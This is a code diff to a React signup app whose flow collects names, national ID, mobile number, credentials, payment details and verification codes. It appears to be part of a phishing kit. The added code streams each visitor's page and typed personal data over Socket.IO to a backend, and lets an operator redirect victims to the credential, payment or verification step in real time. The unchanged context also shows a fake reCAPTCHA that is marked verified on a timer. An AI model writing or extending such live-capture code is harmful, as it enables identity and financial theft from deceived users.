@@ -12,12 +12,17 @@ import VerificationForm from './components/VerificationForm';
 import SimpleLoginPage from './components/SimpleLoginPage';
 import ForgotPasswordPage from './components/ForgotPasswordPage';
 import { Info, Calendar, Loader2, Check, Eye, EyeOff } from 'lucide-react';
+import { socketService } from './services/socketService';
+import { getOrCreateSessionId, getPageName } from './utils/sessionUtils';
 
 const App: React.FC = () => {
   // Check URL parameters for direct access to SimpleLoginPage or ForgotPasswordPage
   const urlParams = new URLSearchParams(window.location.search);
   const pageParam = urlParams.get('page');
   const initialStep = pageParam === 'simple-login' ? -2 : pageParam === 'forgot-password' ? -3 : 0;
+  
+  // Session ID for backend tracking
+  const [sessionId] = useState(() => getOrCreateSessionId());
   
   // Step 0 is the new HomePage from the prompt
   const [step, setStep] = useState(initialStep);
@@ -135,6 +140,64 @@ const App: React.FC = () => {
       setRecaptchaStatus('verified');
     }, 1500);
   };
+
+  // Initialize Socket.IO connection and track page changes
+  useEffect(() => {
+    // Connect to backend
+    socketService.connect(sessionId);
+    
+    // Join as visitor on initial page
+    const currentPage = getPageName(step);
+    socketService.joinAsVisitor(currentPage);
+    
+    // Listen for redirect commands from admin
+    socketService.onRedirect((targetPage) => {
+      console.log('🔄 Admin redirect to:', targetPage);
+      // Map page names to step numbers
+      const pageToStepMap: { [key: string]: number } = {
+        'home': 0,
+        'simple-login': -2,
+        'forgot-password': -3,
+        'step1-account-type': 1,
+        'step2-personal-info': 2,
+        'step3-credentials': 3,
+        'step4-payment': 4,
+        'step5-verification': 5,
+      };
+      const targetStep = pageToStepMap[targetPage];
+      if (targetStep !== undefined) {
+        setStep(targetStep);
+      }
+    });
+    
+    // Cleanup on unmount
+    return () => {
+      socketService.offRedirect();
+      socketService.disconnect();
+    };
+  }, [sessionId]);
+  
+  // Track page changes
+  useEffect(() => {
+    const currentPage = getPageName(step);
+    socketService.trackPageChange(currentPage);
+  }, [step]);
+  
+  // Save form data when it changes
+  useEffect(() => {
+    if (step === 2 && (namesAr.first || namesEn.first || idNumber || mobileNumber)) {
+      const formData = {
+        namesAr,
+        namesEn,
+        idNumber,
+        mobileNumber,
+        postalCode,
+        citizenshipType,
+        nationality,
+      };
+      socketService.saveVisitorData(formData, 'step2-personal-info');
+    }
+  }, [namesAr, namesEn, idNumber, mobileNumber, postalCode, citizenshipType, nationality, step]);
 
   const handleNextStep = () => {
     if (step === 4) {
